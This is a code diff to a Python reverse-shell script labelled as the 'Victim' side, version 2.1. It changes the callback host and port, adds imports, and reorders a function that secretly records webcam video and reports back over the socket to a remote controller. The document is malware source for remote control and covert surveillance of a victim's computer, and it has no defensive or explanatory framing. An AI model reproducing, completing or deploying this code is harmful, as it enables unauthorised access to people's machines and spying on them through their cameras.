@@ -1,8 +1,10 @@
 # Reverse Shell 
-# Plane version 2.0
+# Plane version 2.1
 # Author: Edilmar Castones Lulab
 # Victim
 
+import cffi
+import numpy
 import subprocess
 import socket
 import time
@@ -17,9 +19,9 @@ def socket_create():
 		global host
 		global port
 		global s
-		host = '192.168.31.38' # your ip
-		port = 4444 # your port
-		s = socket.socket()
+		host = '0.0.0.0' # your ip
+		port = 1234 # your port
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	except socket.error as msg:
 		print("Socket creation error: " + str(msg))
 
@@ -327,13 +329,12 @@ def video_record(cmd):
 
 		print()
 		print('  [!] VIDEO RECORD')
-		print('  [!] Recording, Please wait for: ' + str(duration) + ' sec')
 
-		s.send(str.encode('VIDEO_RECORDING', 'utf-8'))
-		
 		cap = cv2.VideoCapture(0)
 		fourcc = cv2.VideoWriter_fourcc(*'XVID')
 		out = cv2.VideoWriter(file_Name,fourcc, 10, (640,480))
+
+		print('  [!] Recording, Please wait for: ' + str(duration) + ' sec')
 		
 		for x in range(0,duration):
 			ret, frame = cap.read() 
@@ -346,6 +347,7 @@ def video_record(cmd):
 		cv2.destroyAllWindows()
 
 		file_Size = os.path.getsize(file_Name)
+		s.send(str.encode('VIDEO_RECORDING', 'utf-8'))
 
 		print('  [*] File Name: ' + file_Name)
 		print('  [*] File size: ' + str(file_Size))
@@ -372,12 +374,14 @@ def video_record(cmd):
 			print()
 
 	except Exception as msg:
-		s.send(str.encode(str(msg), 'utf-8'))
-		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
+		
 		print()
 		print('  [!] VIDEO RECORD FAILED')
 		print('  [*] Please Try Again')
 		print()
+
+		s.send(str.encode(str(msg), 'utf-8'))
+		s.send(str.encode(str(os.getcwd()) + '> ','utf-8'))	
 
 def main():
 	global s
